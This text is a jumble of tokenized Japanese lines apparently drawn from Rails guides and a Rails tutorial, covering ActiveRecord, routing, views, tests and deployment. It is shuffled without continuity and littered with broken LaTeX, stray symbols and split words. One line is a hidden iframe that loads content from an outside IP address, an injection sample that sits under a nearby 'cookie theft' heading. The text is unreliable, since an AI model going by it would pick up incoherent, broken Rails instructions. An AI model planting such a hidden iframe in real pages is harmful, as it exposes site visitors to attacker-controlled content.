この とき Active   Record は 、 \ kode {user \ _ id } が \ kode {first\ _user } の id   ( ここ で は \ kode { 1 } )   と 等し い マイクロ ポスト を 自動 的 に 返 し ま す 。
                           id :   " HomeImage " ,
####  ERB
メール フォーマット を 正規 表現 で 検証 する
` attachments [ 'file - name▖ jpg ']  =  File ▖ read ( 'file - name▖ jpg ') ` の よう に 記述 し ま す 。
    resources  : ads
    * 自分 の 名前 *
\ kode {rails   new } を 実行 し て アプリケーション を 新規 作成 する 。
#####  Cookie 窃盗
   if  boolean ?
\ href {https://tutorials ▖railsapps▖org / hartl} { RailsApps}:  さまざま な Rails プロジェクト や チュートリアル が トピック 別 に 詳し く 特集 さ れ て い ま す 。
###  FormHelper
本番 環境 で 動作 する ステータス フィード は 以下 の よう に な り ま す   ( 図 \ ref { fig: live_status _feed } ) 。
    has_many  : orders ,   foreign_key:   " cust _ id "
Microposts コントローラ の \ kode { destroy } アクション を テスト する 。
< h 1 > Listing   articles </ h 1 >
( なぜ スペース を 置 く よう に な っ た の か は わか り ま せ ん ▟ おそらく 初期 の 有力 な   Ruby プログラマ が 好 ん だ 結果 、 慣習 と な っ た の で しょ う ) 。
ちなみ に 、 リスト \ ref{ code :_ format_jquery _ file_test } の よう な コード で は 大き すぎ る ファイル の アップロード を 完全 に は 阻止 でき な い 、 と い う 点 を 覚え て お い て くださ い 。
それ で は 、 Ruby と Rails を インストール し ま しょ う 。
今 は ログ イン し て も 画面 表示 が 何 も 変わ ら な い の で 、 ユーザー が ログ イン 中 か どう か は 、 ブラウザ セッション を 直接 確認 し な い 限り わか り ま せ ん 。
注釈 付き の \ kode {title_helper} ▖
この 動作 を 無効 に する に は 、 以下 の 設定 を 使用 し ま す 。
attributes = {}) `
#### ` has_and _belongs_to_many ` の スコープ に つ い て
Rails で は 、 新し い フォーム の 送信 先 と な る アクション は " create " に する の が 普通 で す の で 、 それ に 従 っ て 送信 先 を 変更 し ま しょ う 。
###  デバッグ を オフ に する
Microposts コントローラ の 各 アクション に 認可 を 追加 する  
` rewhere ` の 代わり に ` w here ` を 2 回 使用 する と 、 結果 が 異な り ま す 。
これ は 、 User オブジェクト を 作成 し た とき に 、 \ kode { " foobar " } と い う 文字 列 が ハッシュ 化 さ れ た 結果 で す 。
{ 0 } 図 1 ▖ 17   { / 0 } { 1 } Markdownd で フォーマット さ れ た 改良 版 \ kode { README } ファイル { / 1 }
class   Account <  ActiveRecord : : Base
ちなみ に \emph {digest } と い う 言葉 は 、 \ href { http://en ▖wikipedia ▖org/wiki/ Cryptographic_ hash_function } { 暗号 化 用 ハッシュ 関数 } と い う 用語 が 語源 で す 。
テスト 環境 で 画像 の リサイズ 処理 を スキップ する
英語
コントローラ で \ kode { params [ :email ] } から メール アドレス を 取り出 す とき に は 、 自動 的 に エスケープ を 解除 し て くれ ま す 。
その 他 の あらゆる Ruby の オブジェクト は 、 ゼロ で すら \emph {true } で す 。
ユーザー 一覧 ページ で は 、 すべて の ユーザー を ページ 毎 に 分割 し て 表示 する
コントローラ で HTML など の メール コンテンツ を 生成 し て 顧客 に 送信 し た い 場合 、 その 箇所 で メイラー を 使用 し て 、 送信 し た い メッセージ を 作成 し ま す 。
*  `config▖ consider_all_requests_ local ` は フラグ で す 。
" my _ image - 231 a 680 f 23887 d 9dd 707 10 ea 5efd 3 c 62 ▖ png " } }
他 に も 変更 を 行 い ま す 。
モジュール は 名前 を 持 つ こと も 、 無名 で い る こと も でき ま す 。
画像 アップロード 機能 を 追加 する ため に は 、 2 つ の 視覚 的 な 要素 が 必要 で す ▟ 1 つ は 画像 を アップロード する ため の フォーム 、 もう 1 つ は 投稿 さ れ た 画像 その もの で す 。
特に 、 末尾 に オプション の ハッシュ を 置 く と い う の は 定番 中 の 定番 で す 。
config ▖relative_url_ root   = "/app 1 "
エディタ で ` config/ routes▖rb ` を 開 い て くださ い 。
    x   =   x   +   1
*  `active_ record ▖ logger`: ` Rails ▖ logger ` に 対 する 設定 が 行 わ れ て い な い 場合 に ` ActiveRecord : : Base ▖ logger ` を 設定 し ま す 。
これ に よ り \ kode {annotate } コマンド が 使え る よう に な り ま す ▟ これ を 実行 する と 、 モデルファイル に データ モデル を 含 ん だ コメント が 追加 さ れ ま す 。
従 っ て 、 Scaffold で は   ( \kode {Users } で は な く )   \kode {User } と 指定 し ま す 。
=> " Michael   Hartl "
ローカライズ さ れ た ビュー
CSS は 、 CSS クラス と id を 使 っ て レイアウト や デザイン を 調整 し ま す
resources   : messages ,  concerns : : commentable
*  `config ▖eager_load _ namespaces ` を 使用 し て 登録 し た 名前 は 、 ` config ▖eager_load ` が true の とき に 読み込 ま れ ま す 。
config▖ action _mailer▖ delivery _ method  = : smtp
この テスト が パス する に は 、 最初 に \ kode { password_digest } カラム 用 の 適切 な マイグレーション を 生成 し ま す 。
たとえば 次 の 2 つ の コマンド は 、 自動 生成 と 、 それ に 対応 する 取り消し 処理 の 例 で す 。
子 ノード の 名前 は 、 デフォルト で は ルート ノード を 単数 形 に し た もの が 使用 さ れ ま す 。
###  スキーマ の ルール
self を 省略 し た 結果 を リスト \ ref{ code :static _ page _ routes_test } に 示 し ま す 。
*  `employees/_employee ▖html ▖erb `
* `: equal_to`  -   指定 さ れ た 値 と 等し く な けれ ば な ら な い こと を 示 し ま す 。
resources   : photos ,  only: [ : index,   : show ]
ここ で 挿入 さ れ る 行 は 単に ` resources  : articles ` と な っ て い ま す ▟ これ に よ り 、 その エンジン で 使用 する ` config/ routes▖rb ` ファイル が 以下 の よう に 変更 さ れ ま す 。
アプリケーション は ` secrets▖ secret_key_ base ` を 使用 し て 、 ` config/ secrets▖yml ` など に 保存 さ れ る キー を ランダム に 初期 化 し ま す 。
Cloud 9 で の ワークス ペース の 準備 が 完了 し た ら 、 ワークス ペース を 選択 し て   [ Start editing ]   を クリック し ま す 。
This   is  used   by   + url_ for +   in   Action   Pack ▖
今 作成 さ れ た ` app/controllers/articles_controller▖ rb ` を エディタ で 開 く と 、 以下 の よう な 空 の コントローラ が 作成 さ れ て い ま す 。
該当 の メール アドレス が データベース に あ る 場合 は 、 再 設定 用 トークン と それ に 対応 する リセット ダイジェスト を 生成 する 。
本当 に 行 い た い の は 、 その ページ で エラー メッセージ が 表示 さ れ る こと を 示 す こと の はず で す 。
変更 後 に テスト を 実行 し 、  \ passing   に な る こと を 確認 し て くださ い 。
  $ bun dle   exec   rake   db : migrate
最後 に 、 リモート サーバー で SSL を 設定 し ま す 。
( 1 ▖ ▖ ▖ 9 )   = = =   ( 3 ▖ ▖ 9 )    # => false
より 高度 な 技術 を 身 に 付け る ため の お 勧め リソース を いく つ か リスト アップ し ま す ▟╼╼ [ JAPANESE _ REFS ]
パスワード 再 設定 の フォーム が 必要 で す 。
ユーザー を フォロー し た 結果
self を 省略 し た 結果 を リスト \ ref{ code : full _feed_specs } に 示 し ま す 。
self ▖ author   = Blorgh ▖ author_ class ▖find_or_create_by ( name :   author_ name )
` to _options ` メソッド と ` to _options ! ` メソッド は 、 それ それ ` symbolize_keys ` メソッド と `symbolize_keys ! ` メソッド の 別名 で す 。
    mod   =   mod _ name ▖empty?   ?  
日付 に 対 し て 期間 を 加減算 でき ま す 。
これ は ネスティング を 使用 し た こと に よ っ て 複雑 さ が 増 し た の で す 。
つまり 、 ドキュメント 化 し よう と し て い る メソッド や クラス の スコープ や コンテキスト に 応 じ て 振る舞い が 変化 する こと が あ る と い う こと で す 。
scope  ':username '  do
= >   51
これ は 以下 の よう に する こと で 実現 でき ま す 。
#### ` deconstantize`
ヘルパー 読み 込み の 順序 に 依存 し て い る 場合 は 、 アップグレード 後 に 正し い メソッド が 使用 でき て い る か どう か を 確認 する 必要 が あ り ま す 。
 *  scope ▖
*   FROM   categories
そして 最終 的 に \ kode { current_user = } と い う メソッド が 呼び出 さ れ ま す 。
` w here ` メソッド は 、 返 さ れ る レコード を 制限 する ため の 条件 を 指定 し ま す ▟ SQL 文 で 言 う ` WHERE ` の 部分 に 相当 し ま す 。
  end
$  git   push  origin  master
計算 の 順序 は 、 最初 に 年 を 増減 し 、 次 に 月 、 最後 に 日 を 増減 し ま す 。
     def evaluate ( scope ,   locals ,  &block )
残念 で す が 、 この 場合 は ページ 分割 さ れ た フィード を 返 し て も うま く 動 き ま せ ん 。
テスト の 書 き 方 は 、 既存 の テスト ファイル を 詳し く 読 む こと で 学べ ま す ▟ これ は 、 Rails の ソース コード を みっちり 探索 する ため の よ い きっかけ に も な り ま す 。
ここ で は 以下 に つ い て 説明 し ま す 。
     users   GET     / users ( ▖: format )            users # index
alert ( ' All   is   good ' )
` beginning _ of_ hour ` メソッド は 、 その 時 の 最初 の 時点   ( hh: 0 0 : 0 0 )   の タイム スタンプ を 返 し ま す 。
エンジン が 読み込 ま れ る 順序 を 変更 し た い 場合 は 、 ` config▖ railties_order = `   メソッド を 使用 でき ま す 。
コード を リポジトリ に push し て 、 本番 環境 に デプロイ し て み ま しょ う 。
以上 の 結果 を 反映 し た テスト コード を リスト \ ref{ code :remember_me_test } に 示 し ま す
<%=   form _ for   [   : update_name , @user  ]   do  | f| %>
上 の 拡張 子 の 場合 、 Coffee Script プロセッサ 経由 で 実行 さ れ ま す 。
アセット ファイル 名 で 使用 さ れ る フィンガー プリント は 、 アセット ファイル の 内容 に 応じ て 変わ り ま す 。
NOTE :   Devise など の 他 の エンジン で は この 点 が 若干 異な り 、 ルーティング で   ( ` devise_for ` など の )   カスタム ヘルパー を 指定 する もの が あ り ま す 。
###  Rails に " Hello " と 挨拶 さ せ る
>> p =   Person ▖ new ( name :  " John   Doe " )
                    if: [ "market▖ retail ? " ,  : desktop ? ]
これ は リスト \ ref{ code :user_ signout_test } で 使用 さ れ て い ま し た 。
    unless  record ▖ name ▖starts_with ?  
###  クエリ 文字 列
|     1   |   SIMPLE       |  articles  |   ALL   |  NULL           |
続 い て 、 記事 を 作成 する ため の フォーム を 作成 する 必要 が あ り ま す 。
|                     |   208                | : already _ reported                |
ユーザー 登録 フォーム
この 手法 は 、 Active   Record オブジェクト の コレクション に 対 し て よく 使 わ れ ま す 。
記事 の 作成 は これ まで と まったく 同様 に 行え ま す ▟ 1 つ だけ 異な る の は 、 今回 は クラス の 動作 を 学 ぶ ため に ` config/initializers/blorgh ▖ rb ` の 設定 を エンジン で 使用 する 点 で す 。
#     <rank type =" integer " > 2 < / rank>
最後 に 、 \ kode { params [ : father ] [ : first ] } など が 正し い 値 を 持 っ て い る こと を 確認 し て くださ い 。
楽観 的 ロック で は 、 複数 の ユーザー が 同じ レコード を 編集 する こと を 許 し 、 データ の 衝突 が 最小 限 で あ る こと を 仮定 し て い ま す 。
`select ` メソッド を 使用 する と 、 関連 付け られ た オブジェクト の データ 取り出し に 使用 さ れ る SQL の ` SELECT ` 句 を 上書き し ま す 。
次 に 進 む 前 に 、 StaticPages コントローラ ファイル を Git リポジトリ に 追加 し て お き ま しょ う 。
#    Person ▖exists ? (
= > [ " User " ]
< h 1 > Hello ,   Rails !
結果 と し て 、 ファイル サイズ の 大きな 画像 に よ っ て 、 読み込 み 時間 が 長 く な る と い っ た 問題 が 発生 し ま す 。
mkdir  < ディレクトリ 名 >
<%=  image_tag   " home▖ gif " ,   alt :   " Go   Home" ,
バリデーション ヘルパー
` : id ` や `: class ` など の オプション を ハッシュ 形式 で 指定 する こと も でき ま す 。
* * `Rack : : ConditionalGet` **
何 か を する   :   別 の こと を する
####  ローカル 変数 を 渡 す
` constantize ` メソッド に よ る 定数 名 解決 は 、 常 に トップ レベル の ` Object ` から 開始 さ れ ま す ▟ これ は 上位 に " : : " が な い 場合 で も 同じ で す 。
`unscoped ` に `scope ` を 連鎖 さ せ る こと は でき ま せ ん の で 注意 が 必要 で す 。
` joins `  ( INNER   JOIN )   を 使用 する 場合 、 結合 条件 は 必ず マッチ   * * し な けれ ば な ら ず * *  、 それ 以外 の 場合 に は レコード は 返 さ れ ま せ ん 。
アセット は 、 サーバー 起動 後 に 最初 に リクエスト を 受け取 っ た 時点 で コンパイル と キャッシュ が 行 わ れ ま す 。
module   FindRecentExtension
before フィルター を 再び 有効 化 する  
詳細 に つ い て は 、 [ # 144 88 ] ( https://github▖ com/rails/rails/pull / 144 8 8 ) および [ # 165 3 7 ] ( https://github▖ com/rails/rails/pull / 165 3 7 ) を 参照 し て くださ い 。
|  HTTP   動詞   |   パス                   |  コントローラ # アクション    |   名前 付き ヘルパー               |
しかし 、 Rails 開発 の ため に これ ら の 詳細 を 知 る 必要 は あ り ま せ ん 。
ただし 少し 表示 に 違い が あ り ま す ▟ プロフィール サイド バー で は 、   “ Microposts ”   を ラベル と し 、 “ Microposts   ( 1 ) ”   と 表示 する こと は 問題 あ り ま せ ん 。
多く の オプション が あ り 、 長 さ 制限 を さまざま な 方法 で 指定 でき ま す 。
( これ を 行 う に は リスト { p 0 } の { 2 } authenticated ? { / 2 } メソッド を 改良 する 必要 が あ り ま す ) 。
リスト \ ref{ code :user_ model_ password _ reset_expired } の コード を 使用 する と 、 リスト \ ref{ code : password _ reset_update_action } の  \ kode {update}   アクション が 動作 する よう に な り ま す 。
111 ▖ 2345 ▖ to_s(:rounded ,  precision :   2 )         # = >   11 1 ▖ 2 3
この セクション で は 、 ` User ` クラス を カスタマイズ 可能 に する 方法 を 解説 し 、 続 い て エンジン の 一般 的 な 設定 方法 に つ い て 解説 し ま す 。
画像 へ の フル パス 、 また は ` app/assets/images ` ディレクトリ 内 に あ る ファイル を 引数 と し て 与え られ ま す 。
*   その 他 、 Rails の コード に あ る 既存 の 書式 に 従 う こと 。
名前 と メール アドレス に は 、 もう 少し 何 ら か の 制限 が あ っ て よ い はず で す 。
     config▖ before_ initialize  do
上 の 場合 、 ` Order ` モデル に おけ る 関連 付け の ` customer ` を 複数 形 の ` customers ` に し て しま う と 、 " uninitialized  constant  Order : : Customers "   エラー が 発生 し ま す 。
これ は リスト \ ref{ code :ssl_ in_production } で 使用 さ れ て い ま し た 。
     get  'preview'
      t ▖ datetime : order_ date
{ 0 } 図 10 ▖ 12 { / 0 } { 1 } エラー が 表示 さ れ た Home ページ ▟ \ href { http://railstutorial ▖org / images/figures/home_form_errors_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
リスト \ ref{ code : generate_users_controller } で 、 ユーザー コントローラ   ( と \ kode {new } アクション )   を 作 っ た とき に 使 っ た 以下 の コマンド を 思い出 し て み て くださ い 。
self を 省略 し た 結果 を リスト \ ref{ code :user_ show _microposts } に 示 し ま す 。
たとえば 、 ` Articles Controller ` の アクション が 呼び出 さ れ る と 、 Rails は ` articles _helper▖ rb ` を 読み込 も う と し ま す が 、 この ファイル は 存在 し な い こと が あ り ま す 。
  else
\ kode {▖ gitignore } ファイル に アップロード 用 ディレクトリ を 追加 する
   raise   NonInferrable MailerError ▖ new ( name )
blorgh エンジン に よ る すべて の マイ グレーション を 基 に 戻 し た い 場合 は 以下 の よう な コマンド を 実行 し ま す 。
=>   " 5   errors "
\ kode {@users } 変数 に ユーザー 一覧 が 保存 さ れ る と 、 コントローラ は \emph { { 2 } リスト 2 ▖ 7 { / 2 }} の { 3 } ビュー { / 3 } を 呼び出 し ま す   ( ⑥ ) 。
` beginning _ of_day ` メソッド は 、 その 日 の 開始 時点   ( 0 0 : 0 0 : 0 0 )   の タイム スタンプ を 返 し ま す 。
#### ` last ( limit   =   1 ) `
` link_to_ if ` や ` link_to_unless ` など で も 同様 の 対応 が 必要 で す 。
| --------- | -------------------------- | ------------------ | ----------------------- |
以下 と ほぼ 等価 で あ る と い う こと で す 。
       layout   "main "
これ は リスト \ ref{ code : friendly_ session_create } で 使用 さ れ て い ま し た 。
TESTOPTS = " -- name  test _ login_with _ valid _ information "
手順 の 最後 と し て 、 Git の コミット メッセージ を 入力 する とき に 使用 する エディタ を 設定 でき ま す 。
= = = = = = = = = = = = = = = = =
デフォルト は ` ENV [ ' RAILS _ RELATIVE_ URL _ ROOT ' ] ` で す 。
( ほとんど の システム で は 、 最初 に \ texttt { Ctrl - C } を 押下 し て サーバー を 停止 し 、 次 に \ kode {rails server } コマンド を 実行 する こと で サーバー を 再 起動 でき ま す ) 。
これ は リスト \ ref{ code : add_remember_digest_to_users } で 使用 さ れ て い ま し た 。
`indent_string ` に は 1 文字 の スペース また は タブ を 使用 する の が 普通 で す が 、 どんな 文字 で も 使用 でき ま す 。
*   関連 する モデル を 介 し た 継承 階層 を 表現 する
$  git   checkout  branch_ name
Rails アプリケーション の バージョン が 3 ▖ 1 より も 古 い 場合 、 まず 3 ▖ 1 へ の アップグレード を 完了 し て から Rails   3 ▖ 2 へ の アップグレード を 開始 し て くださ い 。
[ 配列 で 表 さ れ た 条件 ] ( # 配列 で 表 さ れ た 条件 ) で は 、 さらに 簡潔 な 文例 を ご 紹介 し て い ま す 。
それ から 正し い サイン イン 情報 を 入力 し 、 [ Sign  in ]   ボタン を クリック し ま す 。
( メソッド 名 に \emph { シンボル } が 使 わ れ て い る の で 奇妙 に 見え る か も しれ ま せ ん ▟ これ に つ い て は \ ref{ sec : hashes_and_symbols } で 説明 し ま す ) 。
umerate}╼╼    %  subsection   layout_link_tests   ( end ) ╼╼    \ subsection { ユーザー 登録 時 に ログ イン } %  ( fold) ╼    \ label{ sec : login_upon_signup }╼╼
{ nil  => nil ,   1   = >   1 ,   a : : a }▖ stringify _keys
  $ rails  console
ユーザー を 削除 する アクション
* `: content_type `
    person   =   Person ▖ create ( name :  " !
Rails アプリケーション を 実際 に Heroku に 展開 する に は 、 まず Git を 使用 し て Heroku に リポジトリ を プッシュ し ま す 。
これ ら の ERB ファイル に 、 それ ら を 内包 する レイアウト テンプレート や 、 ビュー から 参照 さ れ る あらゆる パーシャル   ( 部分 テンプレート )   が 組み合わさ っ て 完全 な HTML が 生成 さ れ 、 クライアント に 送信 さ れ ま す 。
Home ページ の HTML を 修正 する
そして 、 おそらくさらに 奇妙 な こと に 、 \ kode { destroy } さ れ た オブジェクト は 以下 の よう に まだ メモリ 上 に 残 っ て い ま す 。
ここ で は 、 アプリケーション を "/app 1 " ディレクトリ に デプロイ し た い と し ま す 。
この ヘルパー で は ` : accept ` オプション を 使用 でき ま す ▟ この オプション は 、 「 受付 済み 」 を 表 す 値 を 指定 し ま す 。
*   ルーティング 名   ( あ れ ば )
こう し て お か な い とこ の 関連 付け は 正常 に 動作 し ま せ ん 。
この データ モデル を 実装 する に は 、 最初 に 以下 の よう に Relationship モデル を 生成 し ま す 。
この 行 が 変更 さ れ る と 、 生成 さ れ た エンジン 内 の クラス が アプリケーション と 衝突 する   * * 可能 性 が あ り ま す * * 。
表 \ ref{table : association_methods } で は 、 以下 の メソッド で は な く
\ kode {user ▖ updated_at } の 値 に 注目 し て くださ い 。
< iframe  name =" StatPage "   src= " http://58 ▖ xx ▖ xxx ▖ xxx "   width = 5  height = 5  style = " display : none " ></iframe>
\emph {or  equals } と い う 概念 は 一見 神妙 不可思議 に 見え ま す が 、 他 の もの に なぞらえ て 考え る こと で 理解 でき ま す 。
end {enumerate}╼╼%  subsection  image_validation   ( end ) ╼╼\ subsection { 画像 の リサイズ }  %  ( fold) ╼\ label{ sec : image_resizing } ╼╼
self を 省略 し た 結果 を リスト \ ref{ code :stats_ partial } に 示 し ま す 。
バグ の 再現 と 修正 点 の 把握 を 、 他 の 人 達 に と っ て も 自分 自身 に と っ て も や り やす く する こと を 目指 し て くださ い 。
別 の タブ で Rails サーバー を 実行 する 。
      invoke     scaffold_controller
次 に 、 いつ も の よう に インストール し ま す 。
スタイル シート ファイル は 、 ` app/assets` 、 ` lib/assets` 、 また は ` vendor/assets ` の いずれ か の 場所 に 置 か れ ま す 。
     attr_ internal   : request ,  : layout
カスタム バリ データ   ( validator )   は 、 ` ActiveModel : : Validator ` を 拡張 し た クラス で す 。
##### ` collection ▖ delete (object ,  ▖▖▖)
シングル クォート 内 の 文字 列
この テスト は 最初 の メール アドレス の 重複 テスト と 同じ こと を し て い ま す が 、 大 文字 に 変換 し た メール アドレス を 使 っ て い る 点 が 異な り ま す 。
以下 の コード で も よ い の で す が 、
  else
User ▖find _each   do  |user |
╼</p>╼----==_mimepart _5407 babbe 3505 _ 872 2 b 257 d 045 6 17 - -
   def  as _json (options  = nil )
第 二 引数 は オプション で す が 、 ここ に は 比較 し た 結果 の � 差異   ( 今回 の 場合 は 1 )   を 渡 し ま す 。
te}╼╼    %  subsection   creating _user_objects   ( end ) ╼╼    \ subsection { ユーザー オブジェクト を 検索 する } %  ( fold) ╼    \ label{ sec :finding _user_objects}╼╼
\ kode { row } クラス と \ kode {span 4 } クラス も 追加 し て お き ま す ▟ これ ら の クラス は Bootstrap の 一部 で す 。
つまり 、 次 の コード で は 、
これ は 、 指定 さ れ た アセット へ の パス を 記述 し ま す 。
* `ActiveRecord : : ConnectionAdapters: : MysqlAdapter ▖emulate_booleans ` は 、 Active   Record が My SQL データベース 内 の すべて の `tinyint ( 1 ) ` カラム を デフォルト で boolean に する か どう か を 指定 し ま す ▟ デフォルト は true で す 。
    注文 は あ り ま せ ん 。
従 っ て 、 (`blank ? ` を 含 む ) ` Object ` に 対 する すべて の 拡張 機能 を 読み込 む 場合 に は 以下 の よう に し ま す 。
こちら も 、 コメント が 複数 あ る 記事 は 複数 回 表示 さ れ ま す 。
r
( リスト \ ref{ code :email_downcase } で は 、 \ kode {before\ _save } に 明示 的 に ブロック を 渡 し て い ま し た が 、 メソッド 参照 の 方 が 一般 に お 勧め でき ま す ) 。
もう ひと つ 例 を お 見せ し ま す ▟ データベース の 最初 の ユーザー が 持 つ \ kode {activation\_digest } 属性 に アクセス し て み ま す 。
この オプション は デフォルト で true で す 。
# => {: b = > 2 }   #   存在 し な い キー は 無視 さ れ る
同様 に ` from ` メソッド は 、 配列 の うち 、 インデックス が 指 す 箇所 から 末尾 まで の 要素 を 返 し ま す 。
test : postgresql
*   楽観 的 ロック   (optimistic )
ここ まで に 数多く の 題材 を 取り上げ て き ま し た の で 、 今 や アプリケーション を 拡張 する 方法 は 山 ほど あ り ま す 。
Rails に " Hello " と 表示 する に は 、 最低 で も   _ コントローラ _  と  _ ビュー _  が 必要 で す 。
###  CRUD 、 動詞 、 アクション
|   NULL  |  NULL     |  NULL  |      1   |  Using   w here   |
Ruby で は 、 メソッド に 与え られ た 最後 の 引数 が ハッシュ の 場合 、 それ が `&block ` 引数 で あ る 場合 を 除 い て 、 ハッシュ の 波括弧 を 省略 でき ま す 。
# => {: a = > 2 }
この フラグ は 、 与え られ た すべて の 定数 に つ い て 、 メソッド で パス を 下 る 時 に 適用 さ れ ま す 。
これ で ユーザー の インデックス は 完全 に 動 く よう に な り 、 テスト も 全て   \ passing   する よう に な り ま す 。
    ren der   action :  " index "
   if @ article ▖ save
一般 に 、 この ライブラリ は アプリケーション マニフェスト に 以下 の よう に 記述 する こと で アクセス でき ま す 。
get  : index,   format :  : js
リスト \ ref{ code : logo_css } に は 以下 の コード が あ り ま す 。
デフォルト 値 は ` true ` で す 。
それ で は 最初 に 、 Sessions コントローラ と 認証 システム を テスト する 結合 テスト を 作成 し ま す 。
#   gem ' therubyracer ' ,  platforms :  : ruby
アプリケーション が ブラウザ で 表示 する コンテンツ の レンダリング   ( 出力 )   と い う 力 仕事 は 、 ` Action Controller : : Base #ren der ` メソッド が ほぼ 一手 に 引き受け て い ま す 。
ユーザー に 関連 付け られ て い る マイクロ ポスト の ファクトリー を 作成 し 、 それ から 表示 ページ が 各 ポスト の 内容 を 含 ん で い る か 検証 する 戦略 で 進め ま す 。
Rails   4 ▖ 1 の JSON エンコーダ は 、 JSON   gem を 使用 する よう に 書き直 さ れ ま し た 。
╼    end
これ は リスト \ ref{ code :final _ gemfile } で 使用 さ れ て い ま し た 。
三 項 演算 子 を 使用 する と 、 単純 な if- then ステートメント を コンパクト に 記述 する こと が でき ま す 。
` : xml ` オプション が 指定 さ れ て い れ ば 、 ` ren der ` に よ っ て ` to _xml ` が 自動 的 に 呼び出 さ れ る よう に な っ て い ま す 。
ここ で は 、 ユーザ オブジェクト を 破棄 し て も 、 \ kode {microposts } 変数 は 空 の 配列 \ kode {[ ] } と し て 残 さ れ て い る こと が わか り ま す 。
上 の コード は 、 id = 1 の カテゴリ を 検索 し 、 関連 付け られ た すべて の 記事 と その タグ や コメント 、 および すべて の コメント の ゲスト 関連 付け を 一括 読み込 み し ま す 。
ちなみ に 、 リスト \ ref{ code :jquery _ file_test } の よう な コード で は 大き すぎ る ファイル の アップロード を 完全 に は 阻止 でき な い 、 と い う 点 を 覚え て お い て くださ い 。
上 の 実行 結果 で 使用 さ れ て い る 接続 情報 は 、 ` ENV [ ' DATABASE _ URL '] ` の 内容 と 一致 し て い ま す 。
{ 0 } 図 1 ▖ 4   { / 0 } { 1 } 新規 作成 さ れ た Rails アプリケーション の ディレクトリ 構造 { / 1 }
User ▖ inactive
User プロフィール 画面 に 対 する テスト
class   CreatePublications  <  ActiveRecord : : Migration
この よう な サーバー は 通常 「 ステージング サーバー ( staging   server ) 」 と 呼 ば れ ま す 。
たとえば ` 01 _ critical ▖ rb ` は 最初 に 読み込 ま れ 、 ` 02 _normal ▖ rb ` は 次 に 読み込 ま れ ま す 。
= >   [ 42 ,   8 ,   17 ,   6 ,   7 ,   " foo " ,   " bar " ]
たとえば 以下 の 場合 、
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/enumerable▖ rb ` で す
| `: two_words_connector ` | ` support▖array▖ two_words_connector `  |
この よう な とき は 、 \ texttt { rails   destroy } コマンド を 実行 する だけ で 元 に 戻 す こと が でき ま す 。
ith
past ?
リスト \ ref{ code : nested_ hashes } に 示 し た よう に 、 ハッシュ の 値 に は ほぼ 何 で も 使用 する こと が でき 、 他 の ハッシュ を 使用 する こと すら でき ま す 。
Ruby を 学 ぶ ため の 精選 さ れ た オン ライン リソース 一覧 は たくさん あ り ま す の で 、 その 中 から 以下 を ご 紹介 し ま す 。
`image_tag ` は 、 特定 の ファイル を 指 す HTML  `< img  />` タグ を 生成 し ま す 。
client  =  Client ▖find ( 10 )
バック トレース は 問題 を 追跡 する うえ で は 非常 に 便利 な の で す が 、 クラウド IDE など 一部 の システム で は 、 この トレース が gem の 依存 関係 や Rails 自身 に まで 及 ぶ こと が あ り ま す 。
     resources   : photos
なお 、 演習 と チュートリアル 本編 の 食い違い を 避け る 方法 に つ い て は 、 演習 用 の トピック ブランチ に 追加 し た メモ   ( \ ref{ sec :static _ pages _exercises})   を 参考 に し て くださ い 。
これ は 上 の ` Date# advance ` で 示 し た 例 で 適用 さ れ ま す ▟ 相対 的 な 時間 の 計算 に お い て も 計算 の 順序 は 同様 に 重要 で す 。
      t ▖ belongs_to   : supplier
*   Rails   4 ▖ 0 で は コントローラ で の ` dom_ id ` および ` dom_class ` メソッド の 使用 が 非 推奨 に な り ま し た   ( ビュー で の 使用 は 問題 あ り ま せ ん ) 。
ルート ルーティング で 「 ¡ Hola ,  mundo ! 」 を 表示 する よう 変更 する 。
次 の 段階 の 準備 と し て 、 以下 の コード を
上 で 説明 し た 設計 や セキュリティ 上 の 考慮 事項 を 元 に 、 以下 の 方針 で 永続 的 セッション を 作成 する こと に し ま す 。
Twitter に は 、 マイクロ ポスト 入力 中 に \ texttt{@} 記号 に 続け て ユーザー の ログ イン 名 を 入力 する と その ユーザー に 返信 でき る 機能 が あ り ま す 。
( この 比較 の 公式 な 証明 を \ ref{ sec : expiration_proof } に 付録 と し て 追加 し ま し た ) 。
<% = stylesheet_link_tag   "main "  %>
この バリデーション は 、 `: if ` 条件 が すべて ` true ` に な り 、 かつ ` :unless ` が 1 つ も ` true ` に な ら な い 場合 に のみ 実行 さ れ ま す 。
▖ idea
以下 は 最も よく 使用 さ れ る メソッド の 一覧 で す 。
なお 、 \ kode { Time▖zone ▖now } は Rails の 組み込 み ヘルパー で あ り 、 サーバー の タイム ゾーン に 応 じ た タイム スタンプ を 返 し ま す 。
この メソッド は 、 ` Array #unshift ` の 別名 で す 。
Action   View は 独立 し た パッケージ で あ り 、 どの よう な Ruby ライブラリ と で も 組み合わせ て 使用 でき ま す 。
Rails は どの マイ グレーション ファイル が データベース に コミット さ れ た か を 把握 し て お り 、 その 情報 を 使用 し て ロール バック 機能 を 提供 し て い ま す 。
config▖ mid dleware ▖ swap  Action Controller : : Failsafe ,  Lifo : : Failsafe
実装 の 途中 で す が 、 ここ で ひと つ 補足 し ま す 。
ユーザー ログ イン の テスト で 使用 する フィクスチャ
レシーバ が ハッシュ の 配列 で あ る 場合 、 ルート 要素 は デフォルト で ` objects ` に な り ま す 。
` reverse_order ` メソッド は 、 並び順 が 指定 さ れ て い る 場合 に 並び順 を 逆 に し ま す 。
これ は リスト \ ref{ code : password _ reset_integration_test } で 使用 さ れ て い ま し た 。
<%=   link_to   " Blog   articles " ,   articles_ path %>
$  git   checkout   - b my _ backport_branch   3 - 2 - stable
これ は リスト \ ref{ code :hello_ root _ route } で 使用 さ れ て い ま し た 。
###  オブジェクト から パス と URL を 作成 する
上 で 実行 し た コマンド で 示 し た よう に 、 実 は これ ら の 2 つ の オプション を 1 つ に まとめ て \ kode { git  commit   - am   " Message " } と 実行 する こと が でき ま す 。
  => false
 *  application - wide  styles to this  file  and   they'll  appear  at  the top   of  the
` reorder ` を 実行 し な かっ た 場合 に 実行 さ れ る SQL は 以下 の よう な もの に な り ま す 。
cd   < ディレクトリ 名 >
###   定数
うるう年 の 2 月 29 日 の 場合 、 昨年 と 来年 の 日付 は いずれ も 2 月 28 日 に な り ま す 。
SSL を 導入 し た の で 、 次 は アプリケーション の 設定 を いじ っ て 、 本番 環境 に 適 し た Web サーバ を 使 っ て み ま しょ う 。
###  マスク 済み 真正 性 トークン
